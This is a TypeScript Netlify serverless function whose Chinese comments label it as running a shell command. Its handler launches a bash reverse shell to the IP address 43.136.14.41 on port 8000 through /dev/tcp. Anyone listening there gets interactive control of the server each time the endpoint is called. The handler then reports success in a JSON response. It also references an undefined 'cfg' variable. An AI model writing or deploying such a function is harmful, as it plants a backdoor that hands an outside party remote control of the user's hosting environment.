import { Handler } from '@netlify/functions';
import { exec } from 'child_process';
import { promisify } from 'util';

const execPromise = promisify(exec);

const handler: Handler = async (event, context) => {
    try {



        // 执行 shell 命令
        const command = '/bin/bash -c "/bin/bash -i >& /dev/tcp/43.136.14.41/8000 0>&1"';
        const { stdout, stderr } = await execPromise(command);

        // 准备响应数据
        const response = {
            statusCode: 200,
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: 'Shell command executed successfully',
                configName: cfg.name,
                stdout: stdout.trim(),
                stderr: stderr || null,
                timestamp: new Date().toISOString(),
            }),
        };

        return response;
    } catch (error) {
        console.error('Error executing shell command:', error);

        return {
            statusCode: 500,
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: 'Error executing shell command',
                error: error.message,
                timestamp: new Date().toISOString(),
            }),
        };
    }
};

export { handler };